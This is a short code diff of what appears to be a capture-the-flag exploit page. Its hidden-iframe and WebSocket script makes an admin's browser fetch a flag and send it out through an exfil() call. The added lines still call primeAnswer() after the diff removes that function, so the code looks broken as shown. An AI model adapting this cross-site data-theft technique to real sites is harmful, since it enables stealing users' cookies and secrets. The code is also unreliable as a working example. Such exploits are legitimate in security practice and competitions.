@@ -24,12 +24,11 @@
     };
 
     // Send a GET to /refresh to set answer=flag (if admin has flag cookie)
-function primeAnswer() {
-  const iframe = document.createElement("iframe");
-  iframe.src = ORIGIN + "/refresh?cb=" + Date.now();
-  iframe.style.display = "none";
-  document.body.appendChild(iframe);
-}
+primeAnswer();
+await sleep(2000); // wait 2 seconds, not 400ms
+const res = await ask(ws, "aaaaa").catch(e => "ERR:" + e);
+exfil("TEST_RES:" + JSON.stringify(res));
+
 
 
     // Open WebSocket with timeout
@@ -128,4 +127,5 @@ function primeAnswer() {
     main();
   </script>
 </body>
+
 
